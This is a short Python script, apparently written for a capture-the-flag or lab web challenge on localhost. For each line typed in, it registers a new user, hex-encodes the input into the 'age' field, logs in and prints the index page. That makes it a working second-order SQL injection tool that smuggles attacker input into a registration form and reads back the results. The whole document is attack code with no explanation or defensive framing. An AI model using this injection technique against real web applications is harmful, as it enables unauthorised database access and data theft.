import requests
import os

url = 'http://localhost:11003/'
uname = 'felinae' 
uname_num = 0
password = 'jiangeNB'

while True:
    session = requests.Session()
    inject = input()
    inject_hex = '0x'+inject.encode().hex()
    session.post(url+'register.php', data={
        'username': uname + str(uname_num),
        'password': password,
        'age': inject_hex
    })
    session.post(url+'login.php', data={
        'username': uname + str(uname_num),
        'password': password
    })
    r = session.get(url+'index.php')
    print(r.text)
    uname_num += 1